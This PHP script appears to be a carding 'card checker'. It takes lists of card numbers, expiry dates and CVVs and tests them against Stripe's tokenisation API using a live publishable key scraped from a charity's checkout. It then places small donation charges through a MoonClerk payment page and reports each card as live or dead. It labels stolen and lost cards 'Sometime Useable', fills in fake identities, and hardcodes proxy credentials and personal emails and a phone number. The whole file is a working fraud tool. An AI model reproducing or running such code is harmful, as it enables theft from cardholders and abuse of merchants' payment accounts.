<?php






error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

////////////////////////////===[For Authorizing Cards]

/////////========Luminati
////////=========Socks Proxy


//$proxies = array();
//$proxies [] = '207.229.93.68:1025'; {//Some proxies require IP,port no.
//$proxies [] = '207.229.93.68:1026'; //{$proxies [] = '207.229.93.68:1027';
  //$proxies [] = '207.229.93.68:1028';//$proxies [] = '207.229.93.68:1029';
///if (isset($proxies)) {
    ///$proxy = $proxies[array_rand($proxies)];
///}


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
///if (isset($proxy)) {    // If the $proxy variable is set, then
    ///curl_setopt($ch, CURLOPT_PROXY, $proxy);    // Set CURLOPT_PROXY with proxy in $proxy variable
//}
///curl
/////////========Luminati
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-N910U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.oceanicsociety.org&stripe_xdm_c=default575609&stripe_xdm_p=1'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jack+cooper&card[number]=4190024334089036&card[cvc]=277&card[exp_month]=05&card[exp_year]=27&card[address_zip]=10080&guid=1161117f-a174-4a87-a73d-d780b28930aa11a021&muid=b5195db8-c680-4711-92ab-1da891313132033050&sid=76a4ae12-b4e1-400e-9918-799386a0088b701be4&payment_user_agent=stripe.js%2F7df5c2138%3B+stripe-js-v3%2F7df5c2138&time_on_page=140036&key=pk_live_4VRhmzVJRIlREvyaOF05DbB9&_stripe_account=acct_102opF2fOy8ULYr0&pasted_fields=number');
$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));

echo $token;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://app.moonclerk.com/pay/7bj96o4wja6i');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host:app.moonclerk.com',   
   'accept: application/json, text/plain, */*',
   'X-Checkout-Signature:815f6NXl2U8WrGjEXuv7HXkIDcvvI8I5Tp1UiHArmK0=',
   'content-type: application/json;charset=UTF-8',
   'X-Requested-With: XMLHttpRequest',
   'X-CSRF-Token:zfo-UG-FDZpLM4pWdULat6tDQC9N89ugfLPSBAYx0w_H3KpphO6nhQ9C3moGQq6rav9FWM1dwjVunckPVRKFkw',
   'Origin:https://app.moonclerk.com',
   'referer: https://app.moonclerk.com/pay/7bj96o4wja6i?embed=true',
   'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
   'sec-fetch-mode: cors',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"checkout":{"amount_due_cents":1800,"coupon_amount_cents":0,"custom_id":null,"email":"dcmarveltg@gmail.com","embedded":true,"fee_applied_cents":1800,"fee_cents":0,"interval":"month","interval_count":1,"name":"Jack cooper","payment_strategy":"card","recurring":false,"starts_at":null,"subtotal_cents":1800,"terms_of_service_id":null,"total_cents":1800,"write_off_cents":0,"extension_responses_attributes":[],"custom_field_responses_attributes":[{"custom_field_id":652858,"kind":"text_field","title":"First Name","response":"Rahul"},{"custom_field_id":652859,"kind":"text_field","title":"Last Name","response":"Instinct"},{"custom_field_id":652860,"kind":"text_field","title":"Address","response":"West Ln 68"},{"custom_field_id":652861,"kind":"text_field","title":"City","response":"New York"},{"custom_field_id":652862,"kind":"select","title":"State/Province","response":"New York"},{"custom_field_id":652863,"kind":"text_field","title":"Zip/Postal Code","response":"10080"},{"custom_field_id":753377,"kind":"select","title":"Country","response":"United States"},{"custom_field_id":652864,"kind":"text_field","title":"Email","response":"rahulkumarprojects@gmail.com"},{"custom_field_id":652865,"kind":"text_field","title":"Tax Receipt Name","response":"Rahul "},{"custom_field_id":652866,"kind":"text_field","title":"Phone","response":"13218884413"}],"stripe_token":"'.$token.'"},"v":3}');

$result = curl_exec($ch);

echo $token;
echo $result1;
echo $result;




////////////////////////////===[Card Response]


if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE CyraX</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛ </span></br>';
}
elseif(strpos($result, 'incorrect_zip' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Stolen_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Lost_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Insufficient Funds [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Expired [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ Pickup Card_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Incorrect Card Number [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Declined [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Generic_Decline [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Declined : Do_Not_Honor [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Unchecked [Proxy Dead] [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Security Code Check : Fail [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Expired Card [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Card Doesnt Support This Purchase [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response

///////////////////////////////////////////////===========xD========\\\\\\\\\\\\\\\
?>
